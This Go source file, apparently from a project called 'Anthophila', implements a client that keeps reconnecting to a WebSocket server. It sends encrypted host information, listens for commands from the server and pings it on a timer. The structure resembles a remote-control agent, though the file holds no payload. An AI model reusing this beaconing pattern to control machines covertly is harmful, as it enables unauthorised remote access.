package management

import (
	"Anthophila/information"
	"Anthophila/logging"
	"fmt"
	"time"

	"github.com/gorilla/websocket"
)

// Константа інтервалу перепідключення
const reconnectInterval = 5 * time.Second

// Manager представляє менеджер WebSocket-зʼєднання
type Manager struct {
	LogStatus  bool
	LogAddress string
	ServerAddr string
	Key        string
}

// NewManager — конструктор (фабрика) для створення нового менеджера
func NewManager(logStatus bool, logAddress, serverAddr, key string) *Manager {
	return &Manager{
		LogStatus:  logStatus,
		LogAddress: logAddress,
		ServerAddr: serverAddr,
		Key:        key,
	}
}

// Start ініціалізує WebSocket-зʼєднання і запускає логіку обміну повідомленнями
func (m *Manager) Start() {
	for {
		if err := m.run(); err != nil && m.LogStatus {
			logging.Log(m.LogAddress, "Connection error: %v. Retrying in %v...", err.Error())
		}
		time.Sleep(reconnectInterval)
	}
}

func (m *Manager) run() error {
	cryptoManager, err := NewCryptoManager(m.LogStatus, m.LogAddress, m.Key)
	if err != nil || cryptoManager == nil {
		return fmt.Errorf("failed to init CryptoManager: %v", err)
	}

	nickname := information.NewInfo().InfoJson()
	ws, _, err := websocket.DefaultDialer.Dial(m.ServerAddr, nil)
	if err != nil {
		return fmt.Errorf("failed to connect: %w", err)
	}
	defer ws.Close()

	encryptName := cryptoManager.EncryptText(nickname)
	if encryptName == "" {
		err := fmt.Errorf("failed to encrypt nickname")
		if m.LogStatus {
			logging.Log(m.LogAddress, "Crypto error", err.Error())
		}
		return err
	}

	if err := ws.WriteMessage(websocket.TextMessage, []byte("nick:"+encryptName)); err != nil {
		if m.LogStatus {
			logging.Log(m.LogAddress, "WebSocket send error", err.Error())
		}
		return err
	}

	reader := NewReader(m.LogStatus, m.LogAddress, cryptoManager, ws)
	go reader.ReadMessageCommand(ws)

	// Пінг-сервер кожні N секунд
	ticker := time.NewTicker(reconnectInterval)
	defer ticker.Stop()

	for {
		select {
		case <-ticker.C:
			if err := ws.WriteMessage(websocket.TextMessage, []byte("Ping")); err != nil {
				return fmt.Errorf("ping failed: %w", err)
			}
		}
	}
}
